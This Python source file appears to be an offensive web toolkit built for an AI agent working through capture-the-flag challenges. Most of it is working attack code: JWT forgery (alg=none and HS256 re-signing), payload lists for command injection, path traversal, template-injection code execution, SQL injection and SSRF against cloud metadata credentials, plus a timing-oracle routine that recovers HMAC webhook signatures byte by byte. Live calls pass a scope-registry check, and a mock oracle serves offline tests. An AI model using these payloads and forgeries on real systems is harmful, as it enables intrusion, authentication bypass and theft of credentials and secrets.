#!/usr/bin/env python3
"""web_kit.py - deterministic, stdlib-only helpers for the WEB lane (web_api_cloud), so an agent reuses proven
primitives instead of re-deriving them under the clock. ZERO model cost - pure local computation. The only network
use is the 'timing' subcommand, which measures latency of an AUTHORIZED challenge URL you pass in explicitly; this
module never targets anything on its own. No third-party deps (urllib/hmac/hashlib/base64/json/statistics). ASCII only.

usage (WSL or Windows python):
  python3 web_kit.py jwt <token>                 decode header+payload, flag any flag-like claim
  python3 web_kit.py jwt <token> --none          forge an alg=none variant (signature stripped)
  python3 web_kit.py jwt <token> --hs256 <key>   re-sign HS256 with a guessed/leaked key
  python3 web_kit.py payloads <cat> [--os nix|win] [--read <path>] [--depth N]
                                                 cat = cmdi|lfi|traversal|ssti|sqli|ssrf ; prints ready payloads
  python3 web_kit.py timing <url-with-CAND> [--charset <chars>] [--n 6] [--xff] [--timeout 10] [--method GET]
                                                 per-candidate response-timing side channel (slowest first);
                                                 put the literal token CAND where a char is injected (e.g. ?t=PREFIXCAND)
Library: jwt_decode(tok)->(hdr,payload,sig); jwt_none(tok); jwt_hs256(tok,key); payloads(cat,os,read,depth)->list;
         time_candidates(url,charset,n,xff,timeout,method)->list[(cand,median_ms,n_ok)]
"""
import base64, hashlib, hmac, json, random, statistics, string, sys, time, urllib.request


# ---- JWT -------------------------------------------------------------------
def _b64u_dec(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64u_enc(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def jwt_decode(tok):
    parts = tok.strip().split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need header.payload[.sig])")
    hdr = json.loads(_b64u_dec(parts[0]))
    pay = json.loads(_b64u_dec(parts[1]))
    return hdr, pay, (parts[2] if len(parts) > 2 else "")


def _seg(obj):
    return _b64u_enc(json.dumps(obj, separators=(",", ":")).encode())


def jwt_none(tok):
    hdr, pay, _ = jwt_decode(tok)
    hdr["alg"] = "none"
    return _seg(hdr) + "." + _seg(pay) + "."          # trailing dot, empty signature


def jwt_hs256(tok, key):
    hdr, pay, _ = jwt_decode(tok)
    hdr["alg"] = "HS256"
    body = _seg(hdr) + "." + _seg(pay)
    sig = hmac.new(key.encode(), body.encode(), hashlib.sha256).digest()
    return body + "." + _b64u_enc(sig)


def _jwt_cli(argv):
    tok = argv[0]
    hdr, pay, sig = jwt_decode(tok)
    out = ["header : " + json.dumps(hdr), "payload: " + json.dumps(pay), "sig    : " + (sig[:24] + ("..." if len(sig) > 24 else "") or "(none)")]
    flagish = [k + "=" + str(v) for k, v in pay.items() if any(t in str(k).lower() + str(v).lower() for t in ("flag", "admin", "role", "is_", "priv"))]
    if flagish:
        out.append("claims of interest: " + ", ".join(flagish))
    if "--none" in argv:
        out.append("alg=none forge: " + jwt_none(tok))
    if "--hs256" in argv:
        out.append("HS256 re-sign : " + jwt_hs256(tok, argv[argv.index("--hs256") + 1]))
    return out


# ---- payload catalog (from docs/attack-vectors.md - facts, not invented) ---
def payloads(cat, osname="nix", read=None, depth=8):
    f = read or ("flag.txt" if osname == "win" else "/flag.txt")
    if cat == "cmdi":
        nix = ["; cat %s" % f, "| cat %s" % f, "$(cat %s)" % f, "`cat %s`" % f, "&& cat %s" % f,
               "%%0acat %s" % f, "\\ncat %s" % f, "; id", "| id", "; sleep 5", "|| sleep 5"]
        win = ["& type %s" % f, "| type %s" % f, "&& type %s" % f, "; type %s" % f, "%%0a type %s" % f,
               "& whoami", "| ping -n 5 127.0.0.1"]
        return win if osname == "win" else nix
    if cat in ("lfi", "traversal"):
        out = []
        tgt = "windows/win.ini" if osname == "win" else "etc/passwd"
        up = "..\\" if osname == "win" else "../"
        for d in range(1, depth + 1):
            out.append(up * d + tgt)
        out += ["....//....//....//" + tgt, up.replace("/", "%2f").replace("\\", "%5c") * depth + tgt]
        if osname != "win":
            out += ["php://filter/convert.base64-encode/resource=%s" % f, "/proc/self/environ", "file://%s" % f, "/etc/passwd%00"]
        return out
    if cat == "ssti":
        return ["{{7*7}}", "${7*7}", "${{7*7}}", "#{7*7}", "<%= 7*7 %>", "{{config}}",
                "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat %s').read()}}" % f,
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "<%- include(process.cwd()+'/flag.txt') %>",   # EJS absolute-path include
                "${T(java.lang.Runtime).getRuntime().exec('cat %s')}" % f]
    if cat == "sqli":
        return ["' OR '1'='1", "' OR 1=1-- -", "\" OR \"\"=\"", "') OR ('1'='1", "admin'-- -",
                "' UNION SELECT NULL-- -", "1' ORDER BY 1-- -", "' AND SLEEP(5)-- -", "'||pg_sleep(5)--"]
    if cat == "ssrf":
        return ["http://127.0.0.1/", "http://localhost/", "http://[::1]/", "http://0.0.0.0/",
                "http://[ip]/latest/meta-data/", "http://[ip]/latest/meta-data/iam/security-credentials/",
                "file://%s" % f, "gopher://127.0.0.1:80/_", "http://127.0.0.1:80@evil/"]
    raise ValueError("unknown category: %s (cmdi|lfi|traversal|ssti|sqli|ssrf)" % cat)


# ---- response-timing side channel ------------------------------------------
def _get(url, timeout, method, xff):
    # hs-unique-21 2026-10-21: live calls must flow through web_scope. If a scope is registered for this URL's origin, use scoped_get; otherwise refuse (no unscoped live call).
    try:
        import web_scope as _WS
        if _WS.scope_for(url) is None:
            return 0.0  # refuse silently; the caller sees a flat timing signal and bails
    except Exception:
        return 0.0
    req = urllib.request.Request(url, method=method)
    if xff:
        req.add_header("X-Forwarded-For", ".".join(str(random.randint(1, 254)) for _ in range(4)))
    t0 = time.perf_counter()
    try:
        urllib.request.urlopen(req, timeout=timeout).read()
    except Exception:
        pass                                   # a 403/500/timeout still carries timing signal
    return (time.perf_counter() - t0) * 1000.0


def time_candidates(url, charset, n=6, xff=False, timeout=10, method="GET"):
    res = []
    cands = list(charset) if "CAND" in url else [""]
    for c in cands:
        samples = [_get(url.replace("CAND", c), timeout, method, xff) for _ in range(n)]
        res.append((c or "(as-is)", round(statistics.median(samples), 1), n))
    res.sort(key=lambda r: -r[1])              # slowest first = most likely correct prefix char
    return res


# ---- CF Worker signature-oracle byte-recovery driver (WS, 2026-10-26, joint D27 Trust-the-Webhook family) ----
# Pairs with HS's webhook_trust_bypass.py (recognize + 4 non-timing probes). This half owns the TIMING byte-recovery.
# KEY DIFFERENCE vs time_candidates above: uses the ORIGIN worker duration from `Server-Timing: cfWorker;dur=<ms>`
# as the oracle instead of HTTP wall-clock. HS screened the live Day-19 target and measured CF edge noise at
# 95-151ms wall-clock; the cfWorker;dur header carries only the Worker CPU/compare cost (~50-200ms range) and
# is immune to CF edge jitter. If the Worker's signature compare is non-constant-time (`==` on strings, not
# crypto.subtle.timingSafeEqual), each correct prefix nibble adds a small but measurable constant to cfWorker;dur.
# NEVER called live against a GM target without web_scope registration + operator approval. The function refuses
# live calls that the scope registry does not cover (same guard as _get above).

def _post_worker_dur(url, body, headers, timeout=10):
    """POST and return (status, cfWorker_dur_ms_or_None, body_text). Returns (None, 0.0, "") if web_scope refuses."""
    try:
        import web_scope as _WS
        if _WS.scope_for(url) is None:
            return None, 0.0, ""
    except Exception:
        return None, 0.0, ""
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        hdrs, status = resp.headers, resp.status
        body_s = resp.read(1024).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        hdrs, status = e.headers, e.code
        body_s = e.read(1024).decode("utf-8", "replace")
    except Exception:
        return None, 0.0, ""
    st_hdr = hdrs.get("Server-Timing") or hdrs.get("server-timing") or ""
    import re as _re
    m = _re.search(r"cfWorker;dur=([0-9.]+)", st_hdr)
    worker_dur = float(m.group(1)) if m else None
    return status, worker_dur, body_s


def recover_hmac_sig(url, body, sig_header, sig_len=64, charset="0123456789abcdef",
                     samples=50, suffix_rand_per_position=True, timeout=12, min_signal_ratio=2.0,
                     seed=None):
    """Walk a hex signature byte-by-byte via cfWorker;dur timing oracle.
    url: POST target. body: the exact body bytes we want signed (bytes or str).
    sig_header: name of the signature header we are recovering (e.g. 'X-Signature').
    sig_len: full signature length in CHARS (sha256 hex = 64, sha1 hex = 40, base64 = 44).
    charset: candidate chars to try at each position.
    samples: samples per candidate; HS screen says >=50 given CF noise.
    suffix_rand_per_position: if True, draw a fresh random suffix ONCE per position (fixed-random across
                              the 50 samples at this position so the only variable is the nibble under test).
                              If False, re-randomize per sample (averages content-dependent noise but costs
                              more samples to converge).
    min_signal_ratio: HOLD and return None if (top_median - bottom_median) / mean_stdev < this.
    seed: optional RNG seed for deterministic offline tests.

    Returns (recovered_sig_hex_or_None, per_position_report).  per_position_report is a list of dicts, one per
    position: {position, best_char, best_median_ms, second_best_median_ms, spread_ms, stdev_ms, signal_ok}.

    SAFETY: live calls are gated by web_scope; an unscoped URL returns ([], []) silently (same policy as _get).
    NEVER call live against the Day-19 GM target without operator approval + a 1-position dry-run first.
    """
    import statistics as _stats
    import re as _re
    rng = random.Random(seed) if seed is not None else random
    recovered = ""
    report = []
    # One up-front sanity call to confirm the sig_header is actually being READ by the Worker.
    # If the baseline (random valid-length sig) worker dur is indistinguishable from no header at all,
    # the Worker never reads sig_header -> abort before wasting the sample budget.
    probe_sig = "".join(rng.choice(charset) for _ in range(sig_len))
    s_with = []; s_without = []
    scoped_refuse = 0
    for _ in range(10):
        st, d, _ = _post_worker_dur(url, body, {sig_header: probe_sig}, timeout)
        if st is None and d == 0.0:
            scoped_refuse += 1
        elif d is not None:
            s_with.append(d)
        st, d, _ = _post_worker_dur(url, body, {}, timeout)
        if st is None and d == 0.0:
            scoped_refuse += 1
        elif d is not None:
            s_without.append(d)
    if scoped_refuse > 10:  # majority of calls were refused by web_scope
        return None, [{"position": -1, "error": "web_scope refused the url: not registered as an authorized target (unscoped live call blocked)"}]
    if len(s_with) < 5 or len(s_without) < 5:
        return None, [{"position": -1, "error": "unscoped or no Server-Timing cfWorker;dur header (web_scope refused or CF stripped the header)"}]
    med_with = _stats.median(s_with); med_without = _stats.median(s_without)
    sanity = {"position": -1, "sanity_med_with_sig_header_ms": med_with, "sanity_med_without_ms": med_without,
              "sanity_delta_ms": med_with - med_without}
    report.append(sanity)
    # If the delta is tiny, the Worker likely rejects BEFORE reading the sig header - timing attack won't work.
    if abs(med_with - med_without) < 1.0:
        sanity["abort_reason"] = "worker rejects before reading signature header (med_with == med_without); timing oracle not present"
        return None, report
    for pos in range(sig_len):
        # Fixed-random suffix for this position (same suffix across all 50 samples for every candidate).
        if suffix_rand_per_position:
            fixed_suffix = "".join(rng.choice(charset) for _ in range(sig_len - len(recovered) - 1))
        results = []  # list of (candidate_char, [sample_durs...])
        for c in charset:
            durs = []
            for sample_i in range(samples):
                if suffix_rand_per_position:
                    suffix = fixed_suffix
                else:
                    suffix = "".join(rng.choice(charset) for _ in range(sig_len - len(recovered) - 1))
                candidate_sig = recovered + c + suffix
                _status, worker_dur, _b = _post_worker_dur(url, body, {sig_header: candidate_sig}, timeout)
                if worker_dur is not None:
                    durs.append(worker_dur)
            if durs:
                results.append((c, durs))
        if len(results) < 2:
            report.append({"position": pos, "error": "insufficient samples for signal evaluation"})
            return None, report
        # Robust stat per candidate: median + stdev. Rank by SLOWEST 2 of samples (less sensitive to outliers
        # than the median of 50 for small timing signals, per HS's screen notes).
        per_cand = []
        for c, durs in results:
            top2 = sorted(durs, reverse=True)[:max(2, samples // 10)]
            top2_median = _stats.median(top2)
            per_cand.append((c, top2_median, _stats.median(durs), _stats.pstdev(durs) if len(durs) > 1 else 0.0, len(durs)))
        per_cand.sort(key=lambda x: -x[1])  # by top2_median descending (slowest first = most likely correct)
        top_char, top_m, top_full_med, _, _ = per_cand[0]
        _, snd_m, _, _, _ = per_cand[1]
        mean_stdev = sum(x[3] for x in per_cand) / len(per_cand)
        spread = top_m - per_cand[-1][1]
        signal_ok = (mean_stdev == 0) or ((spread / mean_stdev) >= min_signal_ratio)
        report.append({"position": pos, "best_char": top_char, "best_top2_median_ms": top_m,
                       "second_best_top2_median_ms": snd_m, "spread_ms": spread, "mean_stdev_ms": mean_stdev,
                       "signal_ok": signal_ok, "signal_ratio": (spread / mean_stdev) if mean_stdev else None})
        if not signal_ok:
            # HOLD per operator rule: no speculative advance when noise swamps signal.
            return None, report
        recovered += top_char
    return recovered, report


# ---- offline mock for tests (no network, no web_scope dependency) ----
def _mock_worker_oracle_factory(secret_hex, step_ms=4.0, baseline_ms=55.0, noise_ms=1.5, no_sig_ms=40.0, seed=0):
    """Return a function post_worker_dur_mock(url, body, headers) that simulates a non-constant-time hex compare.
    - If no sig header: returns no_sig_ms + noise (modelling an EARLY REJECT, before the compare runs).
    - With sig header: baseline_ms + step_ms*(matched prefix chars) + noise. This matches a real Worker where
      the sig check only runs when the header is present, so the sanity call sees a measurable delta.
    For TESTS ONLY — never used in the live path."""
    _rng = random.Random(seed)
    def mock(url, body, headers, timeout=10):
        sig = (headers or {}).get("X-Signature") or (headers or {}).get("x-signature") or ""
        if not sig:
            return 403, no_sig_ms + _rng.uniform(-noise_ms, noise_ms), '{"error":"webhook_rejected"}'
        matched = 0
        for a, b in zip(sig.lower(), secret_hex.lower()):
            if a == b: matched += 1
            else: break
        dur = baseline_ms + step_ms * matched + _rng.uniform(-noise_ms, noise_ms)
        return 403, dur, '{"error":"webhook_rejected"}'
    return mock


def _timing_cli(argv):
    url = argv[0]
    charset = argv[argv.index("--charset") + 1] if "--charset" in argv else (string.ascii_lowercase + string.digits + "_-{}")
    n = int(argv[argv.index("--n") + 1]) if "--n" in argv else 6
    timeout = int(argv[argv.index("--timeout") + 1]) if "--timeout" in argv else 10
    method = argv[argv.index("--method") + 1] if "--method" in argv else "GET"
    xff = "--xff" in argv
    out = ["timing %s  (n=%d, xff=%s) - slowest first:" % (url, n, xff)]
    for cand, med, k in time_candidates(url, charset, n, xff, timeout, method):
        out.append("  %-8s %8.1f ms" % (repr(cand), med))
    return out


USAGE = __doc__.split("usage", 1)[1]


def main():
    if len(sys.argv) < 3:
        print("usage" + USAGE)
        return 2
    cmd, rest = sys.argv[1], sys.argv[2:]
    try:
        if cmd == "jwt":
            lines = _jwt_cli(rest)
        elif cmd == "payloads":
            osn = rest[rest.index("--os") + 1] if "--os" in rest else "nix"
            read = rest[rest.index("--read") + 1] if "--read" in rest else None
            depth = int(rest[rest.index("--depth") + 1]) if "--depth" in rest else 8
            lines = payloads(rest[0], osn, read, depth)
        elif cmd == "timing":
            lines = _timing_cli(rest)
        else:
            print("unknown subcommand: %s" % cmd)
            return 2
    except Exception as e:
        print("error: %s" % e)
        return 1
    print("\n".join(lines))
    return 0


if __name__ == "__main__":
    sys.exit(main())
